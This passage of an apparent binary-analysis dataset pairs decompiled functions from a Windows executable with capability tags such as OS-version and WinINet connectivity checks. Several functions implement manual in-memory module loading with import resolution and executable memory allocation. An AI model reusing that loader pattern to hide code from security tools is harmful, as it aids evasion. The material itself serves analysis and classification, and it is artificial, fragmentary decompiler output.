        "decompiled_code": "\nvoid fcn.00463fa8(void)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar3 = *(in_EAX + 0x30);\n    if (-1 < iVar3 + -1) {\n        iVar4 = 0;\n        do {\n            piVar1 = *(in_EAX + 0x28) + iVar4 * 0x20;\n            if ((0 < piVar1[1]) && (*piVar1 != 0)) {\n                fcn.00402f1c();\n            }\n            if (piVar1[5] != 0) {\n                fcn.00404650();\n            }\n            if (piVar1[7] != 0) {\n                fcn.00404650();\n            }\n            iVar2 = fcn.0042ede8();\n            piVar1[7] = iVar2;\n            *piVar1 = 0;\n            piVar1[1] = 0;\n            piVar1[5] = 0;\n            piVar1[2] = 0;\n            piVar1[3] = 0;\n            *(piVar1 + 6) = 0;\n            iVar4 = iVar4 + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return;\n}\n",
        "token_count": 317
    },
    "0046423c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046423c(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    char cVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iVar4;\n    uint *arg_8h;\n    int32_t iStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    puStack52 = 0x46425b;\n    var_ch = in_EAX;\n    var_4h = param_2;\n    fcn.004059cc();\n    uStack56 = 0x4643ce;\n    iStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    *(var_ch + 0xc) = 0;\n    *(var_ch + 0x10) = 0;\n    *(var_ch + 0x14) = 0;\n    puStack52 = &stack0xfffffffc;\n    fcn.00405530();\n    if (*(var_ch + 4) != 0) {\n        fcn.004641c0();\n    }\n    if (var_10h < -1) {\n        var_10h = -1;\n    }\n    *(var_ch + 0xb) = var_10h == -1;\n    uVar1 = fcn.00462b38(&fcn.0046423c::var_14h, 0, var_10h == -1);\n    *(var_ch + 4) = uVar1;\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffac;\n    iVar4 = 1;\n    uVar2 = fcn.0046348c(1, &fcn.0046423c::var_8h);\n    cVar3 = '\\x01' - ((uVar2 & 0x80000000) != 0);\n    *in_FS_OFFSET = iVar4;\n    if (cVar3 != '\\0') {\n        if (var_10h == -1) {\n            arg_8h = &fcn.0046423c::var_20h;\n            uVar2 = fcn.00463b00(arg_8h);\n            if ((uVar2 & 0x80000000) == 0) {\n                *(var_ch + 0x18) = var_18h;\n                *(var_ch + 0x1c) = var_1ch;\n                *(var_ch + 0x20) = var_20h;\n            }\n            else {\n                cVar3 = '\\0';\n            }\n        }\n        else {\n            arg_8h = 0x464334;\n            cVar3 = fcn.00464c90();\n        }\n    }\n    if (cVar3 == '\\0') {\n        fcn.004641c0();\n    }\n    else {\n        *(var_ch + 9) = 1;\n        fcn.00405584();\n        fcn.00463c4c(fcn.00463db8, var_ch);\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 770
    },
    "004643e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004643e0(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (*(in_EAX + 0x1c4b) == '\\0') {\n        iVar2 = 0;\n        do {\n            uVar1 = fcn.00403450(iVar2);\n            *(in_EAX + 0x4c + iVar2 * 4) = uVar1;\n            uVar1 = fcn.00403450(iVar2);\n            *(in_EAX + 0x44c + iVar2 * 4) = uVar1;\n            uVar1 = fcn.00403450(iVar2);\n            *(in_EAX + 0x84c + iVar2 * 4) = uVar1;\n            uVar1 = fcn.00403450(iVar2);\n            *(in_EAX + 0xc4c + iVar2 * 4) = uVar1;\n            uVar1 = fcn.00403450(iVar2);\n            *(in_EAX + 0x104c + iVar2 * 4) = uVar1;\n            iVar2 = iVar2 + 1;\n        } while (iVar2 != 0x100);\n        fcn.00403af4();\n        iVar2 = 0;\n        do {\n            *(in_EAX + 0x184b + iVar2) = iVar2;\n            iVar2 = iVar2 + 1;\n        } while (iVar2 != 0x100);\n        iVar2 = 0x100;\n        do {\n            *(in_EAX + 0x184b + iVar2) = 0xff;\n            iVar2 = iVar2 + 1;\n        } while (iVar2 != 0x400);\n        *(in_EAX + 0x1c4b) = 1;\n    }\n    return;\n}\n",
        "token_count": 414
    },
    "004648b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004648b4(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    int32_t var_4h;\n    \n    if (*(in_EAX + 0x24) != 0) {\n        puStack12 = 0x4648df;\n        var_4h = in_EAX;\n        fcn.00464948();\n        if (*(*(var_4h + 0x24) + 0x50) < 1) {\n            puStack12 = 0x4648f0;\n            fcn.0042537c();\n            uStack16 = 0x46493b;\n            uStack20 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffec;\n            arg_8h = *(*(var_4h + 0x28) + 0x14 + *(var_4h + 0x2c) * 0x20);\n            puStack12 = &stack0xfffffffc;\n            fcn.0042525c(arg_8h);\n            *in_FS_OFFSET = arg_8h;\n            uStack16 = 0x464942;\n            uStack20 = 0x46493a;\n            fcn.004255b4();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 311
    },
    "00464948": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00464948(uint param_1, int32_t *param_2)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uint uVar5;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_5h;\n    \n    uStack44 = 0x464b5f;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    if ((*(param_2 + 6) != '\\0') || (*param_2 == 0)) goto code_r0x00464b44;\n    if (param_2[5] == 0) {\n        iVar3 = fcn.00429388();\n        param_2[5] = iVar3;\n    }\n    iVar3 = (**(*param_2[5] + 0x2c))();\n    if ((iVar3 != param_2[2]) || (iVar3 = (**(*param_2[5] + 0x20))(),  iVar3 != param_2[3])) {\n        fcn.0042a8dc();\n        (**(*param_2[5] + 0x40))();\n        (**(*param_2[5] + 0x34))();\n    }\n    bVar2 = false;\n    uVar5 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    iVar3 = param_2[4];\n    if (iVar3 < 0x3259555a) {\n        if (iVar3 == 0x32595559) goto code_r0x00464a41;\n        if (iVar3 == 0) {\n            if (param_2[2] * param_2[3] * 3 == param_2[1]) {\n                fcn.00429acc();\n                fcn.004030fc();\n            }\n            else {\n                bVar2 = true;\n            }\n        }\n        else {\n            if ((iVar3 == 0x30323449) || (iVar3 == 0x32315659)) goto code_r0x00464a60;\ncode_r0x00464a87:\n            bVar2 = true;\n        }\n    }\n    else {\n        if (iVar3 != 0x564e5559) {\n            if (iVar3 == 0x56555949) {\ncode_r0x00464a60:\n                uVar1 = param_2[2] * param_2[3] * 3;\n                iVar3 = uVar1 >> 1;\n                if (iVar3 < 0) {\n                    iVar3 = iVar3 + ((uVar1 & 1) != 0);\n                }\n                if (iVar3 == param_2[1]) {\n                    fcn.00464540();\n                }\n                else {\n                    bVar2 = true;\n                }\n                goto code_r0x00464a89;\n            }\n            if (iVar3 != 0x56595559) goto code_r0x00464a87;\n        }\ncode_r0x00464a41:\n        if (param_2[2] * param_2[3] * 2 == param_2[1]) {\n            fcn.00464738();\n        }\n        else {\n            bVar2 = true;\n        }\n    }\ncode_r0x00464a89:\n    if (bVar2) {\n        if (param_2[4] != 0) {\n            fcn.004030fc();\n        }\n        uVar5 = 0x464b80;\n        uStack44 = 0x464ac9;\n        fcn.0042995c();\n        uStack44 = 0x464ad2;\n        fcn.00425438(uVar5);\n        uStack44 = 0x464b9c;\n        uStack48 = 0x464ae2;\n        fcn.00409d78();\n        uStack48 = 0;\n        fcn.00405794();\n        fcn.004058e0();\n        uVar5 = 0;\n        fcn.0042995c();\n        uVar4 = fcn.00425538();\n        fcn.0042995c(uVar4);\n        fcn.00425438(uVar5);\n    }\n    *(param_2 + 6) = 1;\n    *in_FS_OFFSET = uVar5;\ncode_r0x00464b44:\n    *in_FS_OFFSET = uStack48;\n    uStack44 = 0x464b5e;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1038
    },
    "00464bc8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00464bc8(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    piVar1 = *(in_EAX + 0x28) + param_1 * 0x20;\n    puStack28 = 0x464bf4;\n    (***piVar1[7])();\n    uStack32 = 0x464c6b;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if ((((*piVar1 != 0) && (0 < piVar1[2])) && (0 < piVar1[3])) && (0 < piVar1[1])) {\n        puStack28 = &fcn.00464bc8::var_1h + 1;\n        fcn.00464948();\n        if (*(piVar1 + 6) != '\\0') {\n            (**(*param_2 + 8))();\n            var_1h._0_1_ = 1;\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x464c72;\n    uStack32 = 0x464c6a;\n    (**(*piVar1[7] + 4))();\n    return;\n}\n",
        "token_count": 375
    },
    "00464c90": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00464c90(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    uchar *arg_8h;\n    uint uStack24;\n    uint uStack20;\n    uchar auStack16 [4];\n    \n    if (param_2 < -1) {\n        param_2 = -1;\n    }\n    if ((param_2 == -1) || (*(in_EAX + 0xb) != '\\0')) {\n        fcn.004641c0();\n        uVar1 = fcn.0046423c();\n    }\n    else {\n        uVar1 = 0;\n        fcn.00463a24();\n        arg_8h = auStack16;\n        uVar2 = fcn.00463b00(arg_8h);\n        if ((uVar2 & 0x80000000) == 0) {\n            *(in_EAX + 0xb) = 0;\n            uVar1 = 1;\n            *(in_EAX + 0x18) = arg_8h;\n            *(in_EAX + 0x1c) = uStack24;\n            *(in_EAX + 0x20) = uStack20;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 294
    },
    "00464dc4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00464dc4(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*0x49af44 != 0) && (*(in_EAX + 5) != '\\0')) {\n        fcn.004641c0();\n        fcn.00404650();\n        *0x49af44 = 0;\n        *(in_EAX + 5) = 0;\n    }\n    return;\n}\n",
        "token_count": 94
    },
    "00464df8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00464df8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x464e6a;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (*0x49af44 != 0) {\n        fcn.00409d78();\n        fcn.00405864();\n        cVar1 = fcn.0046423c();\n        if (cVar1 != '\\0') {\n            *(in_EAX + 5) = 1;\n        }\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x464e71;\n    uStack28 = 0x464e69;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 231
    },
    "00464e84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00464e84(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    puStack28 = 0x464ea3;\n    piVar2 = fcn.00429388();\n    uStack32 = 0x464f0b;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (*(in_EAX + 5) == '\\0') {\n        puStack28 = &fcn.00464e84::var_1h + 1;\n        fcn.00404f70();\n        return var_1h;\n    }\n    puStack28 = &fcn.00464e84::var_1h + 1;\n    cVar1 = fcn.00464194();\n    if (cVar1 != '\\0') {\n        var_1h._0_1_ = fcn.00464c80();\n        (**(*piVar2 + 0x68))();\n        fcn.0045fe14();\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x464f12;\n    uStack32 = 0x464f0a;\n    uVar3 = fcn.00404650();\n    return uVar3;\n}\n",
        "token_count": 380
    },
    "00465330": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00465330(int32_t *param_1, uint *param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint auStack264 [13];\n    int32_t iStack212;\n    \n    puVar4 = auStack264;\n    for (iVar2 = 0x3e; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *param_2;\n        param_2 = param_2 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    iVar2 = fcn.004652d8(*param_1);\n    uVar3 = *(*param_1 + 6);\n    if (-1 < uVar3 - 1) {\n        do {\n            if (*(iVar2 + 0x10) == 0) {\n                if (0 < iStack212) {\n                    uVar9 = 4;\n                    uVar8 = 0x1000;\n                    iVar6 = *(iVar2 + 0xc);\n                    uVar7 = 0;\n                    iVar5 = iStack212;\n                    uVar1 = fcn.0046523c(iVar6, 0);\n                    uVar1 = sub.kernel32.dll_VirtualAlloc_1(uVar1, iVar6, uVar7, iVar5, uVar8, uVar9);\n                    *(iVar6 + 8) = uVar1;\n                    fcn.00403af4();\n                }\n                fcn.0046520c(0x28, 0);\n            }\n            else {\n                uVar10 = 4;\n                uVar9 = 0x1000;\n                uVar1 = *(iVar2 + 0x10);\n                iVar6 = *(iVar2 + 0xc);\n                uVar8 = 0;\n                uVar7 = fcn.0046523c(iVar6, 0);\n                uVar1 = sub.kernel32.dll_VirtualAlloc_1(uVar7, iVar6, uVar8, uVar1, uVar9, uVar10);\n                iVar5 = 0;\n                fcn.0046523c(*(iVar6 + 0x14), 0);\n                fcn.00408568();\n                *(iVar5 + 8) = uVar1;\n                fcn.0046520c(0x28, 0);\n            }\n            uVar3 = uVar3 - 1;\n        } while (uVar3 != 0);\n    }\n    return;\n}\n",
        "token_count": 604
    },
    "00465434": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00465434(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    int32_t *piVar2;\n    uint16_t *puVar3;\n    int32_t iVar4;\n    uint32_t arg_8h_00;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    puVar1 = fcn.00465314();\n    if (puVar1[1] != 0) {\n        piVar2 = fcn.0046523c(*puVar1, 0);\n        while (*piVar2 != 0) {\n            fcn.0046523c(*piVar2, 0);\n            puVar3 = fcn.0046523c(8, 0);\n            iVar4 = fcn.0040345c();\n            do {\n                arg_8h_00 = *puVar3 & 0xfff;\n                if (*puVar3 >> 0xc == 3) {\n                    fcn.0046523c(arg_8h_00, 0);\n                    fcn.0046520c(arg_8h_00, 0);\n                }\n                puVar3 = puVar3 + 1;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n            fcn.0046520c(piVar2[1], 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 331
    },
    "00465520": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00465520(int32_t arg_8h)\n\n{\n    char cVar1;\n    ushort uVar2;\n    uint *puVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    int32_t **in_FS_OFFSET;\n    int32_t *in_stack_fffffebc;\n    int32_t *piStack308;\n    uint uStack304;\n    uchar *puStack300;\n    uint var_118h;\n    uint var_112h;\n    int32_t var_10h;\n    int32_t hModule;\n    int32_t *lp;\n    uint var_1h;\n    \n    puStack300 = &var_1h + 1;\n    uStack304 = 0x465760;\n    piStack308 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack308;\n    var_1h._0_1_ = 1;\n    puVar3 = fcn.00465314();\n    if (puVar3[1] != 0) {\n        lp = fcn.0046523c(*puVar3, 0);\n        while( true ) {\n            in_stack_fffffebc = lp;\n            iVar7 = sub.kernel32.dll_IsBadReadPtr(lp, 0x14);\n            if ((iVar7 != 0) || (lp[3] == 0)) goto code_r0x00465747;\n            fcn.0046523c(lp[3], 0);\n            uVar4 = fcn.004652cc();\n            hModule = sub.kernel32.dll_LoadLibraryA(uVar4);\n            if (hModule == -1) break;\n            if (*(arg_8h + 8) == 0) {\n                uVar4 = fcn.00402ee8();\n                *(arg_8h + 8) = uVar4;\n            }\n            uVar4 = fcn.00407160(*(arg_8h + 8), (*(arg_8h + 0xc) + 1) * 4);\n            *(arg_8h + 8) = uVar4;\n            if (*(arg_8h + 8) == 0) {\n                fcn.00405584();\n                var_1h._0_1_ = 0;\n                goto code_r0x00465747;\n            }\n            var_10h = *(arg_8h + 0xc) * 4;\n            fcn.0046520c(var_10h, var_10h >> 0x1f);\n            piVar5 = *(arg_8h + 8);\n            *piVar5 = hModule;\n            piVar5[1] = 0;\n            fcn.00465224(var_10h, var_10h >> 0x1f);\n            *(arg_8h + 0xc) = *(arg_8h + 0xc) + 1;\n            if (*lp == 0) {\n                piVar5 = fcn.0046523c(lp[4], 0);\n            }\n            else {\n                piVar5 = fcn.0046523c(*lp, 0);\n            }\n            piVar6 = fcn.0046523c(lp[4], 0);\n            for (; *piVar5 != 0; piVar5 = piVar5 + 1) {\n                cVar1 = fcn.00465324();\n                if (cVar1 == '\\0') {\n                    fcn.0046523c(*piVar5, 0);\n                    fcn.00408568();\n                    iVar7 = sub.kernel32.dll_GetProcAddress_1(hModule, &var_112h + 2);\n                    *piVar6 = iVar7;\n                }\n                else {\n                    uVar2 = fcn.0046531c();\n                    iVar7 = sub.kernel32.dll_GetProcAddress_1(hModule, uVar2);\n                    *piVar6 = iVar7;\n                }\n                if (*piVar6 == 0) {\n                    fcn.00405584();\n                    var_1h._0_1_ = 0;\n                    break;\n                }\n                piVar6 = piVar6 + 1;\n            }\n            fcn.0046520c(0x14, 0);\n        }\n        fcn.0046523c(lp[3], 0);\n        fcn.004652cc();\n        fcn.00405728();\n        fcn.00405864();\n        var_1h._0_1_ = 0;\n    }\ncode_r0x00465747:\n    *in_FS_OFFSET = in_stack_fffffebc;\n    fcn.00405530(0x465767);\n    return;\n}\n",
        "token_count": 1065
    },
    "00465d80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00465d80(uint param_1, uint16_t *param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    uint32_t arg_8h;\n    int32_t iVar5;\n    bool bVar6;\n    uint uVar7;\n    \n    puVar1 = fcn.00465314(param_2, 0, 0xffffffff);\n    if (puVar1[1] == 0) {\n        uVar7 = 0x465dba;\n        fcn.00405584();\n    }\n    else {\n        uVar7 = 0;\n        iVar2 = fcn.0046523c(*puVar1, 0);\n        if ((*(iVar2 + 0x18) == 0) || (*(iVar2 + 0x14) == 0)) {\n            fcn.00405584();\n        }\n        else {\n            puVar3 = fcn.00465280();\n            fcn.00465280();\n            iVar5 = *(iVar2 + 0x18);\n            do {\n                arg_8h = *puVar3;\n                fcn.0046523c(arg_8h, 0);\n                fcn.004652cc();\n                iVar4 = fcn.0040a978();\n                if (iVar4 == 0) {\n                    arg_8h = *param_2;\n                    break;\n                }\n                puVar3 = puVar3 + 1;\n                param_2 = param_2 + 1;\n                iVar5 = iVar5 + -1;\n            } while (iVar5 != 0);\n            if (param_2 == 0xffffffff) {\n                fcn.00405584(arg_8h);\n            }\n            else {\n                bVar6 = param_2 < 0;\n                if (-1 < param_2) {\n                    bVar6 = *(iVar2 + 0x14) + -1 < param_2;\n                }\n                if (bVar6) {\n                    fcn.00405584(arg_8h);\n                }\n                else {\n                    fcn.0046523c(param_2 * 4, param_2 * 4 >> 0x1f);\n                    puVar1 = fcn.00465280();\n                    fcn.0046523c(*puVar1, puVar1[1]);\n                }\n            }\n        }\n    }\n    return uVar7;\n}\n",
        "token_count": 542
    },
    "00465fc0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00465fc0(void)\n\n{\n    int32_t *in_EAX;\n    code *pcVar1;\n    int32_t iVar2;\n    bool bVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint extraout_var;\n    \n    if ((in_EAX != NULL) && (*(in_EAX + 4) != '\\0')) {\n        uVar4 = *(*in_EAX + 0x28);\n        uVar6 = 0;\n        pcVar1 = fcn.0046523c(uVar4, 0);\n        (*pcVar1)(in_EAX[1], 0, 0, uVar4, uVar6, extraout_var);\n        *(in_EAX + 4) = 0;\n        iVar2 = in_EAX[3];\n        if (-1 < iVar2 + -1) {\n            iVar5 = 0;\n            do {\n                iVar5 = iVar5 * 4;\n                uVar4 = 0x46601e;\n                fcn.0046520c(iVar5, iVar5 >> 0x1f);\n                bVar3 = in_EAX[2][1] == 0;\n                if (bVar3) {\n                    bVar3 = *in_EAX[2] == -1;\n                }\n                if (!bVar3) {\n                    sub.kernel32.dll_FreeLibrary_1(uVar4);\n                }\n                fcn.00465224(iVar5, iVar5 >> 0x1f);\n                iVar5 = iVar5 + 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        fcn.00407148(in_EAX[2]);\n        if (in_EAX[1] != 0) {\n            sub.kernel32.dll_VirtualFree_1(in_EAX[1], 0, 0x8000);\n        }\n        uVar4 = sub.kernel32.dll_GetProcessHeap(0);\n        sub.kernel32.dll_HeapFree(uVar4);\n    }\n    return;\n}\n",
        "token_count": 455
    },
    "004663f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004663f8(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.00403af4();\n    sub.msacm32.dll_acmStreamConvert(*(in_EAX + 0x104), in_EAX + 0x108, 4);\n    sub.msacm32.dll_acmStreamReset(*(in_EAX + 0x104), 0);\n    *(in_EAX + 0x100) = 0;\n    return *(in_EAX + 300);\n}\n",
        "token_count": 113
    },
    "004666c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004666c8(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xec) == '\\0') {\n        *(in_EAX + 0xf8) = param_2;\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "00466764": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00466764(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    \n    puVar1 = *0x49af50;\n    if (*0x49af54 == NULL) {\n        puVar1 = sub.kernel32.dll_VirtualAlloc_1(0, 0x1000, 0x1000, 0x40);\n        *puVar1 = *0x49af50;\n        fcn.004030fc();\n        uVar2 = fcn.0046675c();\n        *(puVar1 + 6) = uVar2;\n        puVar3 = puVar1 + 10;\n        do {\n            puVar4 = puVar3;\n            *puVar4 = 0xe8;\n            uVar2 = fcn.0046675c();\n            *(puVar4 + 1) = uVar2;\n            *(puVar4 + 5) = *0x49af54;\n            puVar3 = puVar4 + 0xd;\n            *0x49af54 = puVar4;\n        } while ((puVar4 + 0xd) - puVar1 < 0xffc);\n    }\n    *0x49af50 = puVar1;\n    puVar3 = *0x49af54;\n    puVar1 = *0x49af54 + 5;\n    *0x49af54 = *(*0x49af54 + 5);\n    *puVar1 = arg_8h;\n    *(puVar3 + 9) = arg_ch;\n    return puVar3;\n}\n",
        "token_count": 372
    },
    "00466810": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
